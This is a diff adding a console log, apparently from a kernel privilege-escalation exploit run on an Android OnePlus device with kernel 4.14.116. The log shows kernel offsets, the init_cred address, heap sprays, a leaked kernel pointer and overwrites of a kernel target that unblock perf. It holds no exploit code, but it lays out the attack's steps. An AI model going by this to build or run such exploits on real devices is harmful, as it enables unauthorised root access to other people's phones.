@@ -1,0 +1,32 @@
+[33m[*] [0mkernel: 4.14.116
+[32m[+] [0moffsets matched: 4.14.116
+[33m[*] [0minit_cred image=ffffff800af640b0 alias=ffffffc002f640b0
+[32m[+] [0mstartup context pid=24599 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=24599 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=24599 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=24599 phys_offset=0000000000000000 kernel_phys_load=0000000000080000 delta=0000000000080000 slide_logger=ffffffc02a4021a0 bootid_data=ffffffc02a6aa868 init_task=ffffffc02a40cf00 root_tg=ffffffc02a63d580 sysctl_bootid=ffffffc02a6aa868
+[33m[*] [0mp0 kernel_phys_load=0000000000080000 phys_offset=0000000000000000 delta=0000000000080000
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mselinux_enforcing absent (4.14 CDY) - unblocking perf instead of W1
+[33m[*] [0mW1c gear m=0 target=ffffffc002f421e8
+[33m[*] [0m=== W1c: perf unblock === target=0xffffffc002f421e8 mode=1
+[33m[*] [0mattempt round (persisted) = 19
+[33m[*] [0m[T+6ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=ffffffd8cee66cc0
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+474ms]   heap spray done
+[33m[*] [0mpvm overlay: target=ffffffc002f421e8 value=0000000000000000 lock=ffffffd8cee60000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
+[33m[*] [0mconsumer: walk fired tid=25892 ret=0 errno=0 calls=1 success=1
+[33m[*] [0mpvm overlay: sendmsg ret=-1 errno=14 walk_done=1 calls=1 success=1
+[33m[*] [0m[T+1487ms]   PI route done
+[33m[*] [0mW1c gear m=19: perf now = 3
+[33m[*] [0mW1c gear m=20 target=ffffffc502f421e8
+[33m[*] [0m=== W1c: perf unblock === target=0xffffffc502f421e8 mode=1
+[33m[*] [0mattempt round (persisted) = 20
+[33m[*] [0m[T+1640ms]   heap spray start
+[33m[*] [0mKernelSnitch setup: cpus=8 mm_per_slab=34 prep=1088 spray=204 pre=33 post=34
+[33m[*] [0m[probe] MM_OVERRIDE fast path leaked=ffffffd8cee66cc0
+[33m[*] [0mprepare_kernel_page ok attempt=1
+[33m[*] [0m[T+2225ms]   heap spray done
+[33m[*] [0mpvm overlay: target=ffffffc502f421e8 value=0000000000000000 lock=ffffffd8cee60000 sgi0=6 siov0=0000000000000000 siov1=0000000000000000
